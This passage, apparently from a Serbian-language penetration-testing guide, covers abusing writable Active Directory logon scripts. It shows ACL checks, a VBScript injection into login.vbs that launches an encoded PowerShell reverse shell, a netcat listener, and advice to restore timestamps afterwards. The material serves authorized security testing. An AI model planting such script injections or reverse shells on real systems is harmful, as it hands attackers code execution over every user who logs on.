- Parsirati `.lnk` fajlove da bi se razrešila odredišta koja vode do SYSVOL/NETLOGON-a (koristan DFIR trik i za napadače bez direktnog pristupa GPO-u):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound prikazuje atribut logon skripte `scriptPath` korisničkog objekta kada je prisutan. Logon skripte konfigurisane putem GPO-a predstavljaju zasebnu referencu na politiku, zato pregledajte i odgovarajući GPO.

### Proverite pristup za upis (ne oslanjajte se na prikaz deljenih resursa)
Automatizovani alati mogu prikazivati SYSVOL/NETLOGON kao resurse samo za čitanje, čak i kada tačna skripta ima drugačiji NTFS ACL. Započnite inspekcijom te datoteke i njenog nadređenog direktorijuma, bez izmena; odgovarajući Allow ACE-ovi ostaju kandidati jer su bitni efektivni SMB i NTFS pristup, Deny ACE-ovi i trenutni token:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Ovlašćeni test upisa treba da bude specifičan za cilj i reverzibilan, uz prethodno pravljenje rezervne kopije originalne skripte i njeno vraćanje nakon testa. Nemojte prepisivati ispravnu logon skriptu samo da biste testirali pristup; uspešan upis može da se izvrši pri sledećoj prijavi korisnika.

### Ubacivanje koda u VBScript logon skriptu radi RCE-a
Dodajte komandu koja pokreće PowerShell reverse shell (generišite ga na revshells.com) i sačuvajte originalnu logiku kako ne biste narušili poslovnu funkciju:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Osluškujte na svom hostu i sačekajte sledeću interaktivnu prijavu:

```bash
rlwrap -cAr nc -lnvp 443
```

Napomene:
- Izvršavanje se odvija pod tokenom korisnika za logging (ne SYSTEM). Opseg je GPO veza (OU, lokacija, domen) na koju se primenjuje ta skripta.
- Nakon upotrebe vratite izvorni sadržaj i vremenske oznake.

## References

- [1] [Zloupotreba Active Directory ACL-ova/ACE-ova](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privilegovani nalozi i privilegije tokena](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Ažuriranje putanje ACL napada](https://wald0.com/?p=112)
- [4] [Enumeracija ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Eskalacija privilegija pomoću ACL-ova u Active Directory-ju](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Skeniranje privilegija Active Directory-ja i privilegovanih naloga](https://adsecurity.org/?p=3658)
- [7] [Konstruktor ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD operacije nad atributima/UAC-om iz Linuxa](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (članstvo u grupi)](https://www.samba.org/)
- [10] [HTB Puppy: zloupotreba AD ACL-ova, razbijanje KeePassXC Argon2 i dešifrovanje DPAPI-ja do administratorskog pristupa DC-u](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: otmica UNC putanja GPO-a radi izvršavanja koda i NTLM relay-a](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: iskorišćavanje Active Directory GPO-ova putem NTLM relaying-a i još mnogo toga](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU se šalite? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: iskorišćavanje skrivenih vektora ACL napada u organizacionim jedinicama Active Directory-ja](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simuliranje legitimnih Active Directory servisa na mreži: slučaj iskorišćavanja GPO-a](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — kretanje kroz OU i zloupotreba nasleđenih ACL-ova](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
